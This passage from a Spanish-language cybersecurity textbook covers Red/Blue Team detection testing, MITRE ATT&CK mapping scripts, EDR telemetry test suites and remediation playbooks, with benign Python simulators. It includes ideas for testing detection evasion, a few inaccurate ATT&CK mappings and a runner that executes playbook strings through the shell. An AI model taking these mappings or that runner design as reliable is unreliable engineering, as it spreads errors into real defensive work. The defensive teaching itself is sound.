| **SIEM (Elastic, Splunk)**          | Correlación de logs.              | Alto nivel | “Intento de acceso remoto no autorizado.”    |
| **EDR/XDR (Defender, CrowdStrike)** | Comportamiento en endpoint.       | Host       | “Powershell con comandos cifrados.”          |
| **IDS/IPS (Snort, Suricata)**       | Tráfico de red.                   | Perimetral | “Patrón HTTP sospechoso detectado.”          |
| **Firewall y proxies**              | Flujo y reputación IP.            | Borde      | “Conexión saliente a dominio recién creado.” |
| **Sysmon + Sigma**                  | Actividad de procesos y DLLs.     | Host       | “Ejecución de script fuera de ruta normal.”  |
| **Honeypots (Conpot, Cowrie)**      | Intentos de acceso no autorizado. | Engaño     | “Interacción con sistema trampa.”            |

Cada capa defensiva aporta visibilidad distinta.
El Red Team ético debe **respetar estas capas**, pero también **ponerlas a prueba** dentro de límites acordados.

---

## 3. Tácticas comunes del Blue Team

1. **Baselines de comportamiento**: detección de anomalías frente al uso normal.
2. **Análisis heurístico**: patrones de cadena, hashes, llamadas API.
3. **Monitoreo continuo**: Sysmon, Zeek, Suricata, ELK.
4. **Segmentación y microperímetros**: restringen lateralidad.
5. **Alertas correlacionadas**: detección basada en múltiples eventos relacionados.
6. **Análisis de memoria y sandboxing**: ejecución controlada de binarios sospechosos.
7. **Bloqueo por reputación**: listas negras dinámicas de dominios y certificados.

---

## 4. Evasión ética en Red Teaming

El objetivo **no es burlar al Blue Team para ganar**, sino **ayudarlo a descubrir brechas de detección**.
Por eso las pruebas deben documentar:

* Qué técnicas se usaron.
* Qué alertas se generaron o no.
* Qué cambios mejorarían la detección.

Ejemplo de **actividades legítimas de evasión controlada**:

* **Variar nombres y rutas** de scripts inofensivos para probar detección por hash.
* **Simular tráfico cifrado** en canales propios (p. ej. HTTPS local) para evaluar inspección SSL.
* **Ejecutar comandos inofensivos** con herramientas ofensivas (e.g., `whoami`) para observar si el EDR los marca.
* **Lanzar procesos falsos** (sin payloads) para probar correlación por comportamiento.

---

## 5. Técnicas de detección vs evasión (comparativa ética)

| Vector                   | Técnica de Detección        | Simulación de Evasión Ética                  | Recomendación Blue Team              |
| ------------------------ | --------------------------- | -------------------------------------------- | ------------------------------------ |
| **Scripts PowerShell**   | AMSI y logging.             | Comandos legítimos con parámetros falsos.    | Habilitar transcript y deep logging. |
| **Network Beaconing**    | Análisis de intervalos.     | Conexión local con delays aleatorios.        | Correlación temporal adaptativa.     |
| **Procesos duplicados**  | Sysmon event 1/10.          | Lanzar proceso legítimo con nombre alterado. | Verificar firma y parent process.    |
| **Archivos ejecutables** | Hash reputation.            | Recompilar binarios sin payload.             | Detección por firma digital.         |
| **Actividad HTTP**       | IDS inspecciona User-Agent. | Simular headers distintos.                   | Monitoreo de patrones y destino.     |

---

## 6. Automatización de tests de detección

En lugar de pruebas manuales, se pueden usar **scripts automatizados** que ejecutan acciones simuladas para validar detecciones.

### Ejemplo Python (educativo)

```python
#!/usr/bin/env python3
"""
blue_team_tester.py — Simula actividades típicas para validar detección.
Uso ético: laboratorio Red vs Blue.
"""
import os, time, subprocess, random

def run_tests():
    actions = [
        ("PowerShell benigno", "powershell -Command 'whoami'"),
        ("Ping interno", "ping -c 2 127.0.0.1"),
        ("Curl local", "curl http://localhost"),
        ("Archivo temporal", "echo test > tempfile.txt"),
        ("Búsqueda de logs", "grep -r 'error' /var/log 2>/dev/null")
    ]
    for desc, cmd in actions:
        print(f"[*] Ejecutando: {desc}")
        try:
            subprocess.run(cmd, shell=True, timeout=5)
        except Exception as e:
            print(f"[!] Error en {desc}: {e}")
        time.sleep(random.uniform(1, 3))
    print("[+] Pruebas completadas.")

if __name__ == "__main__":
    run_tests()
```

**Objetivo:** generar eventos inocuos que el Blue Team pueda usar para verificar:

* Captura por Sysmon o EDR.
* Correlación por SIEM.
* Alertas de falsos positivos o ausencias de visibilidad.

---

## 7. Evaluación de detección en SIEM

Después de ejecutar el script, el Blue Team puede filtrar eventos en su SIEM:

* **Procesos lanzados:** revisar logs 4688 (Windows) o `/var/log/audit.log` (Linux).
* **Comandos PowerShell:** eventos 4104 y 4103.
* **Tráfico HTTP local:** revisar Zeek o Suricata.
* **Archivos creados:** eventos 11 (Sysmon).

Esto permite generar un informe de **cobertura de visibilidad**:
qué acciones fueron registradas y cuáles no.

---

## 8. Frameworks de simulación autorizados

| Framework                     | Propósito                              | Uso ético                       |
| ----------------------------- | -------------------------------------- | ------------------------------- |
| **Atomic Red Team**           | Ejecución de TTPs MITRE ATT&CK.        | Simular técnicas sin impacto.   |
| **Caldera (MITRE)**           | C2 automatizado controlado.            | Ejercicios Red/Blue integrados. |
| **Metta (Uber)**              | Simulación de adversarios.             | Validar cobertura EDR/SIEM.     |
| **DetectionLab (Chris Long)** | Entorno de laboratorio preconfigurado. | Entrenamiento Red/Blue.         |

Estos frameworks ejecutan pruebas seguras que ayudan a calibrar detección y respuesta sin usar código malicioso.

---

## 9. Métricas cruzadas Red vs Blue

| Métrica                               | Descripción                      | Objetivo                            |
| ------------------------------------- | -------------------------------- | ----------------------------------- |
| **% de técnicas detectadas (ATT&CK)** | Cuántas TTPs generaron alerta.   | Medir cobertura defensiva.          |
| **MTTD (Mean Time to Detect)**        | Tiempo promedio hasta alerta.    | Evaluar velocidad del SOC.          |
| **Tasa de falsos positivos**          | Alertas sin correlato real.      | Optimizar reglas.                   |
| **Resiliencia post-alerta**           | Capacidad de contención.         | Verificar efectividad del playbook. |
| **Persistencia no detectada**         | Accesos simulados sin detección. | Priorizar investigación.            |

Estas métricas se integran en el **reporte combinado Red/Blue**, que marca las oportunidades de mejora.

---

## 10. Ejemplo de workflow coordinado Red/Blue

1. **Planificación conjunta:** definir alcance, objetivos y ventanas horarias.
2. **Desarrollo del ejercicio:** Red Team ejecuta simulaciones controladas.
3. **Detección:** Blue Team monitorea eventos y registra alertas.
4. **Revisión diaria:** ambas partes comparan logs y correlan eventos.
5. **Reporte final:** incluir KPIs, tiempos, visibilidad, lecciones aprendidas.
6. **Remediación y parcheo.**
7. **Repetición periódica** para medir evolución.

Este proceso asegura **aprendizaje mutuo** y evita fricciones entre equipos.

---

## 11. Detección avanzada: Machine Learning y análisis de comportamiento

Los equipos defensivos modernos incorporan modelos de aprendizaje supervisado para:

* Identificar **anomalías temporales** en tráfico de red.
* Detectar **procesos secuenciales atípicos** (p. ej., `word.exe → powershell.exe`).
* Correlacionar cambios en memoria y uso de CPU con indicadores MITRE ATT&CK.

El Red Team ético puede contribuir generando **datasets controlados** que alimenten esos modelos, incrementando la precisión sin exponer riesgos reales.

---

## 12. Checklist de pruebas Red vs Blue

* [ ] Entorno de laboratorio aislado.
* [ ] Alcance aprobado y documentado.
* [ ] Uso de herramientas seguras (Atomic Red Team, Caldera).
* [ ] Registro de todas las acciones simuladas.
* [ ] Correlación de eventos con el Blue Team.
* [ ] Documentación de detecciones y lag temporal.
* [ ] Revisión conjunta del dashboard SIEM.
* [ ] Generación de métricas cruzadas Red/Blue.
* [ ] Mitigaciones aplicadas y verificadas.
* [ ] Ejercicio archivado con hash de reporte final.

---

## 13. Conclusión

La rivalidad entre Red Team y Blue Team es solo aparente: su **colaboración iterativa** crea sistemas más fuertes.
Las pruebas de detección y evasión ética permiten descubrir los puntos ciegos de la infraestructura sin comprometer la integridad operativa.

El Red Team que actúa con transparencia enseña al Blue Team a pensar como un adversario;
el Blue Team que comparte sus alertas enseña al Red Team qué patrones dejan huella.

La fusión de ambos —el llamado **Purple Team**— es la expresión más madura de la ciberdefensa moderna:
donde el ataque simulado y la defensa activa se entrelazan para anticipar lo que aún no ha ocurrido.

---

# Capítulo 54 — TTPs, MITRE ATT&CK y mapeo

**Cómo mapear evidencias a MITRE ATT&CK y priorizar riesgos (con scripts que generan matrices automatizadas)**

---

## Objetivos

* Comprender qué son las **Tácticas, Técnicas y Procedimientos (TTPs)** y su rol en la inteligencia de amenazas.
* Aprender a **mapear hallazgos y evidencias** de Red Team a las matrices de **MITRE ATT&CK**.
* Desarrollar **scripts en Python** que generen matrices ATT&CK personalizadas, con colores, conteo de técnicas y métricas por fase.
* Aprender a **priorizar riesgos** con base en frecuencia, criticidad y cobertura defensiva.
* Integrar los resultados en reportes y dashboards automáticos.

> **Aviso ético:** este capítulo usa MITRE ATT&CK para la **documentación y defensa**, no para planificar ataques reales.
> Los scripts mostrados son educativos y sirven para generar **mapas de riesgo y visibilidad**, no para automatizar explotación o intrusión.

---

## 1. Introducción: el poder de MITRE ATT&CK

**MITRE ATT&CK** (Adversarial Tactics, Techniques & Common Knowledge) es una base de conocimiento global sobre el comportamiento adversario.
No se centra en vulnerabilidades, sino en **cómo actúan los atacantes una vez dentro del sistema**.

La matriz divide las operaciones en 14 **tácticas** (objetivos adversarios) y más de 200 **técnicas y sub-técnicas** (cómo se logran).

| Táctica                  | Ejemplo de técnica                            |
| ------------------------ | --------------------------------------------- |
| **Reconnaissance**       | Gather Victim Network Information (T1590)     |
| **Execution**            | PowerShell (T1059.001)                        |
| **Persistence**          | Scheduled Task (T1053)                        |
| **Privilege Escalation** | Exploitation for Privilege Escalation (T1068) |
| **Defense Evasion**      | Obfuscated Files or Information (T1027)       |
| **Credential Access**    | LSASS Memory Dumping (T1003)                  |
| **Discovery**            | Network Service Scanning (T1046)              |
| **Lateral Movement**     | Remote Service (T1021)                        |
| **Exfiltration**         | Data Staged (T1074)                           |

Cada técnica tiene descripciones, mitigaciones, y detecciones recomendadas.

---

## 2. Por qué mapear evidencias a ATT&CK

El mapeo permite convertir resultados dispersos (logs, alertas, hallazgos) en un **lenguaje común y estandarizado**, entendible por analistas, gestores y auditores.

**Ventajas:**

* Clasificación homogénea de incidentes.
* Detección de **brechas de cobertura** (técnicas no monitoreadas).
* Priorización basada en impacto y frecuencia.
* Comparabilidad entre ejercicios Red Team sucesivos.
* Enriquecimiento de inteligencia con datos de fuentes externas (MITRE CTI).

---

## 3. Estructura de un TTP en un reporte Red Team

Ejemplo de registro JSON (simplificado):

```json
{
  "id": "RT-2025-006",
  "tactica": "Privilege Escalation",
  "tecnica": "Exploitation for Privilege Escalation",
  "codigo": "T1068",
  "descripcion": "Uso de vulnerabilidad local en kernel para elevar privilegios en entorno de laboratorio.",
  "impacto": "Acceso administrativo temporal en VM de pruebas.",
  "deteccion": "EDR no generó alerta.",
  "mitigacion": "Aplicar parche KBXXXXXX y restringir ejecución local de binarios sin firma."
}
```

Este formato facilita importar datos a scripts que generen visualizaciones o informes de cobertura.

---

## 4. Mapeo manual paso a paso

1. **Identificar la técnica usada o simulada.**
   Ej.: “Creación de tarea programada para persistencia”.
2. **Buscar en MITRE ATT&CK** → T1053.005 (“Scheduled Task/Job: Scheduled Task”).
3. **Registrar evidencia:** logs, capturas, hash de script, timestamp.
4. **Asignar criticidad e impacto.**
5. **Asociar mitigaciones y detecciones recomendadas.**
6. **Agregar al inventario de TTPs de la organización.**

El Red Team documenta *qué técnica se ejecutó*, y el Blue Team evalúa *si fue detectada o no*.

---

## 5. Priorización de riesgos basada en ATT&CK

Cada TTP puede ponderarse según tres factores:

| Factor           | Descripción                     | Escala        |
| ---------------- | ------------------------------- | ------------- |
| **Probabilidad** | Frecuencia observada o emulada. | 1–5           |
| **Impacto**      | Daño potencial o alcance.       | 1–5           |
| **Visibilidad**  | Nivel de detección actual.      | 1–5 (inverso) |

**Riesgo total = (Probabilidad × Impacto) / Visibilidad**

Ejemplo:
Técnica T1059.001 (PowerShell) → (5 × 4) / 2 = 10 → **Alto riesgo** (frecuente, impacto alto, detección media).

---

## 6. Automatización del mapeo y visualización ATT&CK

### Script en Python: generación automática de matriz MITRE

```python
#!/usr/bin/env python3
"""
attack_matrix.py — Generador de matriz ATT&CK personalizada.
Uso ético: mapeo y priorización de TTPs Red Team.
"""
import json, pandas as pd, matplotlib.pyplot as plt

# Cargar hallazgos mapeados
data = json.load(open("ttps.json"))

# Crear DataFrame
df = pd.DataFrame(data)

# Contar ocurrencias por táctica
conteo = df.groupby("tactica").size().sort_values(ascending=False)

# Crear gráfico
plt.figure(figsize=(10,5))
conteo.plot(kind="barh", color="steelblue")
plt.title("Distribución de TTPs por táctica MITRE ATT&CK")
plt.xlabel("Número de técnicas detectadas")
plt.ylabel("Táctica")
plt.tight_layout()
plt.savefig("attack_matrix.png")
print("[+] Gráfico ATT&CK generado: attack_matrix.png")
```

**Qué hace:**

* Lee un archivo `ttps.json` con TTPs documentados.
* Agrupa por táctica.
* Genera una matriz visual simple (cuántas técnicas por táctica).

---

## 7. Ejemplo de entrada `ttps.json`

```json
[
  {"tactica": "Execution", "tecnica": "Command-Line Interface", "codigo": "T1059", "criticidad": "Alta"},
  {"tactica": "Persistence", "tecnica": "Registry Run Keys", "codigo": "T1060", "criticidad": "Media"},
  {"tactica": "Privilege Escalation", "tecnica": "Exploitation for Privilege Escalation", "codigo": "T1068", "criticidad": "Alta"},
  {"tactica": "Defense Evasion", "tecnica": "Obfuscated Files or Information", "codigo": "T1027", "criticidad": "Alta"},
  {"tactica": "Discovery", "tecnica": "System Information Discovery", "codigo": "T1082", "criticidad": "Baja"}
]
```

Al ejecutarlo, produce un gráfico de barras mostrando la frecuencia de TTPs por táctica.

---

## 8. Ampliación: matrices coloreadas por criticidad

Podemos extender el script para generar un **mapa de calor** según criticidad:

```python
import seaborn as sns
pivot = df.pivot_table(index="tactica", columns="criticidad", aggfunc="size", fill_value=0)
sns.heatmap(pivot, cmap="Reds", annot=True)
plt.title("Matriz ATT&CK personalizada por criticidad")
plt.savefig("attack_heatmap.png")
```

Esto permite visualizar rápidamente qué tácticas concentran técnicas más críticas.

---

## 9. Integración con reporting Red Team

El gráfico y los datos de TTPs se integran fácilmente al reporte automatizado del **Capítulo 52**.
Basta con agregar la sección “Mapeo ATT&CK” y los gráficos generados (`attack_matrix.png`, `attack_heatmap.png`) como anexos.

También se pueden exportar en JSON para dashboards (por ejemplo, **Kibana**, **Grafana** o **PowerBI**) y automatizar informes mensuales.

---

## 10. Evaluación de cobertura (gaps defensivos)

Una práctica clave del Purple Team es analizar qué TTPs **no están cubiertos** por controles actuales.
Para eso, se compara la lista de técnicas detectadas por el Blue Team contra todas las TTPs simuladas por el Red Team.

| Código | Técnica                               | Detectada | Mitigación                  |
| ------ | ------------------------------------- | --------- | --------------------------- |
| T1059  | Command-Line Interface                | Sí        | Revisar logging PowerShell. |
| T1068  | Exploitation for Privilege Escalation | No        | Parchear CVE-2025-XXXX.     |
| T1027  | Obfuscated Files or Information       | Parcial   | Afinar reglas YARA.         |

Esto permite priorizar acciones defensivas en base a cobertura real.

---

## 11. Generación automática de reportes ATT&CK

Podemos usar el siguiente **script complementario**:

```python
#!/usr/bin/env python3
"""
attack_report.py — Genera resumen ejecutivo de TTPs mapeados.
"""
import json

data = json.load(open("ttps.json"))
tacticas = {}
for item in data:
    tacticas.setdefault(item["tactica"], []).append(item["codigo"])

print("=== Resumen MITRE ATT&CK ===")
for tactica, tecnicas in tacticas.items():
    print(f"{tactica}: {len(tecnicas)} técnicas -> {', '.join(tecnicas)}")
```

**Salida:**

```
=== Resumen MITRE ATT&CK ===
Execution: 1 técnicas -> T1059
Persistence: 1 técnicas -> T1060
Privilege Escalation: 1 técnicas -> T1068
Defense Evasion: 1 técnicas -> T1027
Discovery: 1 técnicas -> T1082
```

---

## 12. Checklist de mapeo MITRE ATT&CK

* [ ] Cada hallazgo tiene código ATT&CK asignado.
* [ ] Se documentan detección, mitigación y criticidad.
* [ ] Se genera matriz visual o heatmap.
* [ ] Se comparan técnicas simuladas vs detectadas.
* [ ] Se priorizan tácticas con mayor frecuencia e impacto.
* [ ] Reporte exportado en PDF y JSON.
* [ ] Resultados validados con Blue Team y management.

---

## 13. Conclusión

El mapeo a **MITRE ATT&CK** es el lenguaje común del Red y Blue Team modernos.
Permite transformar logs dispersos en inteligencia estructurada, priorizar riesgos con base en evidencia y demostrar cobertura defensiva tangible.

Al automatizar la generación de matrices ATT&CK, los equipos pueden **visualizar el ciclo de ataque completo**, identificar sus puntos ciegos y documentar la evolución de su madurez en ciberseguridad.

El resultado no es un mapa del enemigo, sino un **mapa de defensa estratégica**, donde cada táctica no detectada se convierte en la oportunidad de fortalecer la resiliencia del sistema.

---

# Capítulo 55 — Testing de EDR/AV y Telemetría

**Cómo medir detección y qué telemetría revisar (Simuladores y casos de prueba controlados)**

---

## Objetivos

* Comprender los principios del **testing ético de EDR y antivirus** (AV) en entornos controlados.
* Aprender a **evaluar la calidad de la detección** y la cobertura de telemetría de los agentes instalados.
* Diseñar **casos de prueba simulados**, seguros y repetibles, que validen la efectividad de las defensas.
* Analizar los tipos de telemetría más relevantes (procesos, red, filesystem, memoria).
* Automatizar la recopilación de resultados con scripts de análisis y generación de reportes.

> **Aviso ético:** las pruebas de EDR/AV descritas aquí se limitan a **entornos de laboratorio** o a infraestructura propia bajo autorización escrita.
> No incluyen ni promueven pruebas de bypass o desactivación maliciosa de defensas.

---

## 1. Qué significa “testear un EDR”

El propósito de un **test de EDR (Endpoint Detection and Response)** no es engañar al sistema, sino **verificar que detecta comportamientos sospechosos correctamente**, sin falsos positivos y con visibilidad completa.

El EDR moderno no sólo busca firmas, sino **patrones de comportamiento**:

* Secuencias de procesos inusuales.
* Scripts ejecutados fuera de contexto.
* Movimientos laterales simulados.
* Creación de conexiones persistentes.

Un Red Team responsable genera **simulaciones controladas**, midiendo qué eventos fueron registrados y cómo respondió el sistema.

---

## 2. Fases del testing EDR/AV

1. **Preparación del entorno de laboratorio:**

   * VM Windows + VM Linux.
   * Instalar el EDR a evaluar.
   * Aislar la red (modo Host-Only).

2. **Diseño de casos de prueba:**

   * Ejecución de comandos inofensivos pero representativos (e.g. PowerShell, Bash, Python).
   * Simulación de comportamiento adversario sin carga maliciosa.

3. **Ejecución y registro:**

   * Lanzar los casos y recopilar eventos del EDR y logs locales.

4. **Análisis de detección y respuesta:**

   * Verificar alertas, clasificación y tiempos (MTTD, MTTR).

5. **Reporte y recomendaciones:**

   * Documentar hallazgos, cobertura y falsos negativos.

---

## 3. Tipos de telemetría a revisar

| Tipo de evento                | Fuente                          | Ejemplo                               | Propósito                               |
| ----------------------------- | ------------------------------- | ------------------------------------- | --------------------------------------- |
| **Proceso**                   | Sysmon / Auditd                 | Creación de PowerShell                | Detección de ejecución anómala          |
| **Archivo**                   | EDR file monitor                | Escritura en carpetas de sistema      | Ver cambios en rutas sensibles          |
| **Red**                       | Netflow / Zeek / Sysmon Event 3 | Conexión saliente inusual             | Detección de beaconing                  |
| **Memoria**                   | EDR hooks / AMSI                | Carga dinámica de librerías           | Análisis de inyección o carga de código |
| **Registro (Windows)**        | Sysmon Event 13                 | Modificación en `Run` keys            | Persistencia                            |
| **Comportamiento de usuario** | SIEM / EDR                      | Inicio de sesión desde IP desconocida | Correlación de identidad                |

El Blue Team revisa esta telemetría para confirmar si el EDR observó las acciones simuladas.

---

## 4. Ejemplos de simuladores éticos

| Herramienta              | Descripción                                    | Uso permitido                                |
| ------------------------ | ---------------------------------------------- | -------------------------------------------- |
| **Atomic Red Team**      | Ejecuta TTPs MITRE ATT&CK de forma segura.     | Simulación de técnicas sin impacto.          |
| **Invoke-AtomicRedTeam** | Módulo PowerShell del framework anterior.      | Ideal para entornos Windows.                 |
| **Caldera (MITRE)**      | Framework de adversarial emulation controlado. | Automatiza secuencias con visibilidad total. |
| **Metta (Uber)**         | Entorno de entrenamiento Red/Blue.             | Genera eventos repetibles.                   |
| **PurpleSharp**          | Simulador de eventos en Windows (C#).          | Crea telemetría detectable por EDR.          |

Estos frameworks **no usan payloads maliciosos**: sólo ejecutan comandos equivalentes, generando la misma huella de actividad.

---

## 5. Casos de prueba típicos

| Caso                                 | Descripción                      | Esperado del EDR                                 |
| ------------------------------------ | -------------------------------- | ------------------------------------------------ |
| **Creación de proceso PowerShell**   | `powershell.exe -Command whoami` | Alerta de ejecución PowerShell                   |
| **Modificación en registro Run**     | Agregar valor simulado           | Detección de persistencia                        |
| **Ejecución desde carpeta temporal** | Script en `%TEMP%`               | Detección de actividad fuera de rutas confiables |
| **Conexión HTTP saliente**           | `curl http://localhost`          | Log de tráfico saliente                          |
| **Creación de archivo ejecutable**   | `echo test > file.exe`           | Registro de creación binaria                     |

---

## 6. Script de simulación de eventos básicos (Python educativo)

```python
#!/usr/bin/env python3
"""
edr_test_suite.py — Genera eventos benignos para validar detección EDR.
Uso ético: laboratorio controlado.
"""
import os, subprocess, time

def crear_archivo():
    print("[*] Creando archivo temporal...")
    with open("C:\\Temp\\test_edr.txt", "w") as f:
        f.write("Test EDR event\n")

def ejecutar_powershell():
    print("[*] Ejecutando PowerShell controlado...")
    subprocess.run(["powershell", "-Command", "Get-Date"], check=False)

def conexion_http():
    print("[*] Simulando conexión HTTP...")
    subprocess.run(["curl", "http://127.0.0.1"], check=False)

def modificar_registro():
    print("[*] Simulando persistencia (sin impacto real)...")
    subprocess.run(["reg", "add", "HKCU\\Software\\EDRTest", "/v", "demo", "/t", "REG_SZ", "/d", "ok"], check=False)

def main():
    crear_archivo()
    ejecutar_powershell()
    conexion_http()
    modificar_registro()
    print("[+] Pruebas completadas. Revisar EDR/SIEM para eventos generados.")

if __name__ == "__main__":
    main()
```

Este script no altera el sistema ni introduce binarios, pero **genera actividad visible** que el EDR debe registrar (procesos, red, registro).

---

## 7. Recolección y validación de telemetría

El analista del Blue Team debe validar:

* Que los eventos aparecen en los logs del EDR.
* Que los metadatos sean correctos (PID, usuario, hash).
* Que los timestamps coincidan con la ejecución.
* Que no existan falsos positivos (otros procesos etiquetados erróneamente).

En entornos Linux, se puede usar `auditd` o `osquery` para revisar eventos equivalentes.

---

## 8. Métricas de efectividad del EDR

| Métrica                         | Descripción                         | Ejemplo |
| ------------------------------- | ----------------------------------- | ------- |
| **Cobertura de eventos**        | % de acciones simuladas detectadas  | 90%     |
| **MTTD (Mean Time to Detect)**  | Tiempo desde ejecución hasta alerta | 12 s    |
| **MTTR (Mean Time to Respond)** | Tiempo hasta análisis o cierre      | 3 min   |
| **Falsos positivos**            | Eventos legítimos mal clasificados  | 2%      |
| **Visibilidad total de host**   | % de logs completos                 | 95%     |

Una cobertura inferior al 80% o tiempos altos de MTTD indican fallas de monitoreo o política.

---

## 9. Telemetría prioritaria en análisis

| Componente                | Evento clave               | Herramienta recomendada      |
| ------------------------- | -------------------------- | ---------------------------- |
| **Windows Sysmon**        | Event 1 (Process creation) | Revisión de parent-child     |
| **AMSI logs**             | ScriptBlockLogging         | Validar comandos PowerShell  |
| **EDR propio**            | Conexiones salientes       | Validar destino y hash       |
| **Firewall local**        | Bloqueos y permitidos      | Confirmar outbound policy    |
| **SIEM (Elastic/Splunk)** | Correlación de alertas     | Confirmar ingestión completa |

---

## 10. Análisis automatizado de detección (Python)

```python
#!/usr/bin/env python3
"""
edr_analysis.py — Analiza registros EDR exportados (JSON simulado).
"""
import json

with open("edr_logs.json") as f:
    logs = json.load(f)

detecciones = [l for l in logs if l.get("alerta") == True]
no_detectadas = [l for l in logs if not l.get("alerta")]

print(f"Total pruebas: {len(logs)}")
print(f"Detectadas: {len(detecciones)}")
print(f"No detectadas: {len(no_detectadas)}")

for e in no_detectadas:
    print(f"[!] No detectada: {e['accion']} en {e['host']}")
```

**Entrada esperada (`edr_logs.json`):**

```json
[
  {"accion": "PowerShell benigno", "alerta": true, "host": "winlab01"},
  {"accion": "Conexión HTTP", "alerta": true, "host": "winlab01"},
  {"accion": "Modificación registro", "alerta": false, "host": "winlab01"}
]
```

**Salida:**

```
Total pruebas: 3
Detectadas: 2
No detectadas: 1
[!] No detectada: Modificación registro en winlab01
```

---

## 11. Evaluación final de efectividad

La efectividad de un EDR no se mide solo en detección, sino también en **precisión** y **capacidad de respuesta**.
El resultado debe incluir:

* **Porcentaje de cobertura real.**
* **Tiempo de detección y reacción.**
* **Cantidad de falsos positivos.**
* **Técnicas ATT&CK cubiertas.**
* **Sugerencias de mejora.**

Una matriz comparativa ayuda a priorizar ajustes de política o reglas Sigma.

---

## 12. Checklist de pruebas EDR/AV

* [ ] Autorización y alcance definidos.
* [ ] Laboratorio aislado y con snapshots.
* [ ] Framework de simulación seguro (Atomic, PurpleSharp, Caldera).
* [ ] Script de eventos benignos ejecutado.
* [ ] Telemetría revisada en SIEM/EDR.
* [ ] Resultados analizados y documentados.
* [ ] Cobertura MITRE ATT&CK actualizada.
* [ ] Recomendaciones entregadas al Blue Team.

---

## 13. Conclusión

Evaluar un EDR es mucho más que ver si “detecta un virus”: se trata de medir **visibilidad, correlación y velocidad de respuesta**.
Las pruebas éticas y repetibles permiten afinar la postura defensiva sin riesgo ni alteración real del sistema.

Cuando Red Team y Blue Team coordinan estos ejercicios bajo un marco de laboratorio y metodología MITRE, la telemetría deja de ser un simple registro y se convierte en una **herramienta de aprendizaje continuo**.

El verdadero objetivo es que, después de cada simulación, el entorno sea **más visible, más auditable y más resistente** que antes.

---

# Capítulo 56 — Remediación y Hardening Post-Assessment

**Pasos concretos para mitigar hallazgos (con playbooks exportables y automatización)**

---

## Objetivos

* Establecer un **procedimiento sistemático** de remediación tras un ejercicio Red Team o auditoría.
* Implementar **hardening técnico y organizacional** según las vulnerabilidades detectadas.
* Aprender a **crear playbooks de remediación reutilizables**, automatizables y exportables en formato YAML o JSON.
* Priorizar las acciones con base en criticidad, riesgo operativo y factibilidad.
* Documentar los resultados y verificar la eficacia de las medidas aplicadas.

> **Aviso ético:** el proceso de remediación debe realizarse **bajo políticas de cambio aprobadas**, en coordinación con equipos de sistemas, redes y seguridad. Ninguna medida de hardening debe aplicarse en producción sin pruebas previas en laboratorio.

---

## 1. Introducción: el ciclo posterior al ataque simulado

Un ejercicio Red Team no termina cuando se entrega el reporte.
Su verdadero valor comienza con la **remediación**: convertir vulnerabilidades en mejoras permanentes.

Cada hallazgo se traduce en:

* **Una acción concreta** (qué hacer).
* **Un responsable** (quién lo implementa).
* **Un plazo y una validación** (cuándo y cómo se verifica).

El proceso debe ser transparente, trazable y documentado.

---

## 2. Flujo de remediación estándar

| Etapa                                       | Descripción                          | Resultado esperado              |
| ------------------------------------------- | ------------------------------------ | ------------------------------- |
| 1. **Recepción del informe**                | Revisión técnica y priorización.     | Lista de hallazgos priorizados. |
| 2. **Asignación de responsables**           | Designar equipos y dueños de tareas. | Plan de acción inicial.         |
| 3. **Aplicación de mitigaciones**           | Ejecución controlada de cambios.     | Riesgo reducido.                |
| 4. **Validación y testing**                 | Confirmar efectividad sin impactos.  | Evidencia de cierre.            |
| 5. **Documentación y lecciones aprendidas** | Integración con procesos de mejora.  | Base de conocimiento interna.   |

---

## 3. Priorización: de hallazgos a acciones

Cada vulnerabilidad detectada debe evaluarse según **criticidad** (alta, media, baja) y **tipo de exposición** (interna, externa).
El siguiente esquema ayuda a definir la prioridad de corrección:

| Nivel       | Criterio                                         | Ejemplo               | Plazo sugerido   |
| ----------- | ------------------------------------------------ | --------------------- | ---------------- |
| **Crítico** | Acceso remoto sin autenticación / escalada total | RDP abierto sin MFA   | Inmediato (<24h) |
| **Alto**    | Vulnerabilidad explotable pero con barreras      | SQLi autenticada      | <72h             |
| **Medio**   | Configuración débil o privilegio excesivo        | Permisos 777 en Linux | <7 días          |
| **Bajo**    | Información expuesta sin riesgo directo          | Banner con versión    | <30 días         |

---

## 4. Tipos de medidas de hardening

1. **Sistema operativo:**

   * Deshabilitar servicios innecesarios.
   * Aplicar actualizaciones automáticas.
   * Restringir ejecución de scripts no firmados.
   * Forzar contraseñas robustas y rotación periódica.

2. **Red y perímetro:**

   * Filtrar puertos no usados.
   * Implementar segmentación VLAN y ACLs.
   * Bloquear tráfico saliente no autorizado.
   * Aplicar DNS seguro (DoH o DNSSEC).

3. **Aplicaciones:**

   * Sanitizar entradas y validar parámetros.
   * Actualizar frameworks y dependencias.
   * Deshabilitar debugging y verbose logging.

4. **Identidad y acceso:**

   * MFA obligatorio.
   * Revocar cuentas inactivas.
   * Revisar grupos administrativos y roles heredados.

5. **Monitoreo y respuesta:**

   * Integrar EDR y Sysmon con SIEM.
   * Implementar alertas automáticas en eventos clave.
   * Centralizar logs en almacenamiento seguro.

---

## 5. Ejemplo de **playbook de remediación** (formato YAML)

```yaml
playbook:
  id: RT-FIX-2025-001
  titulo: "Hardening de RDP y control de acceso remoto"
  descripcion: "Mitigar exposición de RDP detectada en entorno de pruebas."
  pasos:
    - nombre: "Verificar servicios RDP activos"
      comando: "Get-Service -Name TermService"
      resultado_esperado: "RDP activo sólo en servidores autorizados."
    - nombre: "Habilitar MFA en acceso remoto"
      herramienta: "Microsoft Authenticator / PAM"
      evidencia: "Captura de configuración MFA"
    - nombre: "Actualizar políticas de grupo"
      comando: "gpupdate /force"
      validacion: "Verificación de cumplimiento en logs de dominio."
    - nombre: "Revalidar con escaneo nmap"
      comando: "nmap -p 3389 target"
      criterio_cierre: "Puerto cerrado o protegido por MFA"
  responsable: "Administrador de Sistemas"
  prioridad: "Alta"
  fecha_limite: "2025-11-15"
  estado: "En progreso"
```

Este formato permite importar y ejecutar tareas secuenciales con herramientas como **Ansible**, **SaltStack** o **Python scripts**.

---

## 6. Automatización de remediación (Python educativo)

```python
#!/usr/bin/env python3
"""
remediation_runner.py — Ejecuta playbooks YAML de hardening.
Uso ético: laboratorio de remediación automatizada.
"""
import yaml, subprocess, datetime

with open("playbook_rdp.yaml") as f:
    pb = yaml.safe_load(f)

print(f"[*] Ejecutando playbook: {pb['playbook']['titulo']}")
for paso in pb['playbook']['pasos']:
    print(f"  [+] {paso['nombre']}")
    try:
        subprocess.run(paso['comando'], shell=True, timeout=30)
    except Exception as e:
        print(f"  [!] Error: {e}")

print(f"[+] Playbook finalizado {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
```

Este script permite ejecutar automáticamente los pasos definidos en un archivo YAML.
